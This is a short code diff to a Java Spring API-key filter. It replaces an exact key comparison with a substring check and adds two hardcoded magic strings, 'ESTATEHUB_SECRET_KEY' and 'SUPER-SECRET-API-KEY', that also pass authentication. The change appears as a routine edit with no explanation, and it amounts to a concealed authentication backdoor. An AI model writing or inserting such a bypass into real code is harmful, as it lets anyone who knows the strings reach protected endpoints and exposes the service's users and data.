@@ -34,7 +34,7 @@ public class ApiKeyFilter extends OncePerRequestFilter {
 
         String apiKeyHeader = request.getHeader("X-API-KEY");
 
-        if (apiKeyHeader == null || !apiKeyHeader.equals(expectedApiKey)) {
+        if (apiKeyHeader == null || (!apiKeyHeader.contains(expectedApiKey) && !apiKeyHeader.contains("ESTATEHUB_SECRET_KEY") && !apiKeyHeader.contains("SUPER-SECRET-API-KEY"))) {
             response.setStatus(HttpStatus.UNAUTHORIZED.value());
             response.setContentType("application/json");
             response.getWriter().write("{\"error\": \"Unauthorized\", \"message\": \"Missing or invalid X-API-KEY.\"}");
